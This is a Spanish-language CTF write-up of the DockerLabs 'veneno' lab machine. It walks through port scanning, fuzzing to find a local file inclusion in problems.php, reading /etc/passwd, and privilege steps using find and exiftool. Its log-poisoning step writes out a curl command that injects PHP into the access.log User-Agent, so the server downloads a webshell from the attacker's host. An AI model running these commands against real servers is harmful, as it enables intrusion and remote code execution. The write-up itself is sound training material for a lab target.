<p><img src="assets/logo-dockerlabs.png" alt="portada" /></p>

<p>En este reto de <a href="https://dockerlabs.es" title="DockerLabs">DockerLabs</a> practicamos.</p>

<ul>
  <li>Scan de puertos</li>
  <li>LFI to RCE</li>
  <li>Log poisoning</li>
  <li>find</li>
</ul>

<h2 id="herramientas-y-recursos">Herramientas y recursos</h2>

<ul>
  <li>nmap</li>
  <li>feroxbuster</li>
  <li>wfuzz</li>
  <li>exiftool</li>
</ul>

<h2 id="reconocimiento-y-enumeracion">Reconocimiento y enumeracion</h2>

<p>Lo primero como siempre le tiramos un nmap con los parámetros de costumbre.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">--min-rate</span><span class="o">=</span>5000 <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oX</span> veneno  172.18.0.2
</code></pre></div></div>

<p><a href="/reporte/veneno.html">reporte</a></p>

<p>En este caso nos encontramos  con el protocolo <strong>ssh</strong> abierto en su versión 7.6 y el <strong>http</strong> por el 80.</p>

<p>La web es la de la instalación por defecto y la versión de ssh nos invita a realizar enumeración de usuarios.</p>

<p>No obstante prefiero hacer un poco de fuzing pq si no hay nada para que esta corriendo.</p>

<p>Buscando directorios</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>feroxbuster <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 400 <span class="nt">-u</span> http://172.17.0.2 
</code></pre></div></div>
<p><img src="assets/veneno/uploads.png" alt="uploads" /></p>

<p>Busquemos ficheros.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>feroxbuster <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 400 <span class="nt">-x</span> php,txt,jpg <span class="nt">-u</span> http://172.17.0.2
</code></pre></div></div>
<p><img src="assets/veneno/problems.png" alt="problems" /></p>

<p>Investigamos el fichero <strong>problems.php</strong> y vemos que nos devuelve siempre al index.html pongamos lo que pongamos , por tanto esta esperando un parámetro especifico que modifique su acción.</p>

<p>Fuzeamos en busca del parámetro.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">--hl</span><span class="o">=</span>363 <span class="nt">-t</span> 200 <span class="nt">-w</span> /usr/share/dict/wordlist-probable.txt <span class="nt">-u</span> <span class="s2">"http://172.17.0.2/problems.php?FUZZ=/etc/passwd"</span>
</code></pre></div></div>

<p><img src="assets/veneno/parametro.png" alt="param" /></p>

<p>Una vez obtenido el parámetro podemos tratar de leer ficheros y corroboramos que podemos leer <strong>/etc/passwd</strong>.</p>

<p><img src="assets/veneno/passwd.png" alt="passwd" /></p>

<p>Ya tenemos un usuario al alcance , pero en esta maquina no van por ahí los tiros así que buscamos logs que nos ayuden.</p>

<h2 id="log-poisoning">Log poisoning</h2>

<p>Encontramos que tenemos el access.log a disposición , tratamos de envenenarlo.</p>

<p><img src="assets/veneno/acceslog.png" alt="log" /></p>

<p>Recordemos que teníamos el directorio uploads con permisos, así que tratamos de subir un a webshell , descargamos la que nos guste y no montamos con python un server el cual dejamos a la espera para posterior subir la webshell con la siguiente petición.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="nt">-i</span> <span class="nt">-v</span> 172.17.0.2 <span class="nt">-A</span> <span class="s2">"&lt;?php system('curl 192.168.0.112:8000/webshell.php -o /var/www/html/uploads/webshell.php'); ?&gt;"</span>
</code></pre></div></div>
<p>El comando superior nos creara un nuevo registro en el access.log el cual se ejecutara cuando refresquemos la pagina y si todo ha ido bien , solo debemos entrar en /uploads y ejecutar la webshell.</p>

<p><img src="assets/veneno/webshell.png" alt="uploadedshell" /></p>

<h2 id="intrusión">Intrusión</h2>

<p>Una vez dentro nos encontramos.</p>

<p><img src="assets/veneno/in.png" alt="in" /></p>

<p>Hacemos un ls sobre el home para ver usuarios y también sobre el directorio html en el cual encontramos un fichero curioso.</p>

<p><img src="assets/veneno/inhackeable.png" alt="inhack" /></p>

<p>Como vemos nos dice que el fichero tiene 24 años y es el mismo desde entonces , osea que debemos buscar un fichero con esa antiguedad.</p>

<p>Haremos uso de find indicándole los días que hace que tiene el fichero.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-type</span> f <span class="nt">-mtime</span> +8760 2&gt;/dev/null
</code></pre></div></div>

<p><img src="assets/veneno/find.png" alt="find" /></p>

<p>Leemos el fichero</p>

<p><img src="assets/veneno/pass1.png" alt="pass1" /></p>

<p>Tenemos ya un pass imaginemos que es el de carlos.
Vamos a ssh</p>

<p>Una vez logueados con Carlos  revisamos su home y nos encontramos lo siguiente.</p>

<p><img src="assets/veneno/carpetas.png" alt="carp" /></p>

<p>Esa estructura nos lleva a suponer que hay algo escondido.
Ejecutando un <strong>ls -laR</strong> podemos listar todo y veremos lo que nos interesa.</p>

<p><img src="assets/veneno/foto.png" alt="foto" /></p>

<p>Nos montamos un server con python y descargamos la imagen para analizarla.</p>

<p>Le pasamos exiftool y veremos una pass conocida.</p>

<p><img src="assets/veneno/pass2.png" alt="rootpass" /></p>

<p><img src="assets/veneno/root.png" alt="root" /></p>

<p>Muchas gracias por llegar hasta aquí , aprendamos juntos y compartamos el conocimiento sea mucho o poco tu opinión puede aportar siempre.</p>

<blockquote class="prompt-danger">
  <p>Si fuzeamos demasiado podemos tener problemas para cargar el access.log , recomiendo en ese caso reiniciar la maquina.</p>
</blockquote>
